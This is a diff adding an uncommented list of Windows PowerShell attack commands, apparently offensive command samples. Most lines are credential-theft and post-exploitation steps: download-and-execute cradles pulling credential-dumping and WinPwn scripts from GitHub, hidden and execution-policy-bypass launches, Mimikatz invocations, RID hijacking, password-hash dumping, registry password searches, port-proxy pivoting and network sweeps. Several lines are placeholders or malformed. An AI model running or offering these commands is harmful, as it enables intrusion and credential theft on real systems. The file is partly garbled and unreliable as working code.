@@ -1,0 +1,35 @@
+Invoke-PhishingAttack -Type Credential
+IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1").Content
+IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1").Content
+Invoke-Command -ScriptBlock { & "https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1" }
+Invoke-Mimikatz -Command "privilege::debug exit" -Force
+Get-CimInstance -Class Win32_ComputerSystem | Export-Csv -Path "C:\results.csv" -NoTypeInformation
+powershell.exe -WindowStyle Hidden -Command "& { IEX (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1').Content }"
+Invoke-RIDHijacking -Username "unina" -RID 500
+Invoke-Mimikatz -Command "privilege::debug exit" -Force -Bypass
+IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1").Content
+powershell.exe -ExecutionPolicy Bypass -Command "& { IEX (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/WINspect.ps1').Content }"
+Get-BrowserInfo -Username "YourUsername" -SearchTerm "YourSearchTerm"
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& { IEX (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1').Content }"
+Get-CimInstance -Class Win32_Group
+Get-Date -Format "YourDateFormat"
+$mimikatzCommand = [System.Text.Encoding]::Unicode.GetBytes("Invoke-Mimikatz -DumpCreds"); [System.Convert]::ToBase64String($mimikatzCommand)
+Invoke-Mimikatz -Command "privilege::debug exit" -Force -Bypass
+Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/credential.ps1').Content
+Get-CimInstance -Class Win32_UserAccount
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Whitecat18/Powershell-Scripts-for-Hackers-and-Pentesters/main/scripts/all_in_one_enum.ps1' -OutFile 'C:\Path\To\Script.ps1'; Invoke-Expression 'C:\Path\To\Script.ps1'
+Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Winlogon' -Name 'PropertyName' -Value 'PropertyValue'
+Get-ChildItem -Path .
+Get-Item -Path 'HKCR:\','HKCU:\','HKLM:\','HKU:\','HKCC:\' -Recurse | Where-Object { $_.Name -like '*password*' -or $_.Value -like '*password*' }
+. .\Get-PassHashes.ps1; Get-PassHashes -CommandType All
+Get-GPO -Domain 'DomainName' -OrganizationalUnit 'OUPath'
+netsh interface portproxy add v4tov4 listenport=5446 listenaddress=5985 connectport=5985 connectaddress=10.35.8.23
+Get-ChildItem -Path 'C:\Path\To\ConfigFiles\' -Recurse | Select-String -Pattern 'password'
+1..254 | ForEach-Object { [System.Net.Dns]::GetHostEntry('10.10.1.' + $_) } | Out-File 'ip_hostname.txt'
+New-SmbShare -Name 'GuestShare' -Path 'C:\Path\To\SharedFolder' -ReadAccess 'Everyone'
+Add-Content -Path 'C:\Path\To\File.txt' -Value 'MaliciousData' -Stream '::$DATA'
+whoami /user
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Base64EncodedPath'))
+Get-ADForest
+Add-Type @" public class MaliciousCode { public static void Execute() { // Malicious code goes here } } "@; [MaliciousCode]::Execute()
+New-NetFirewallRule -DisplayName 'Allow RDP' -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow
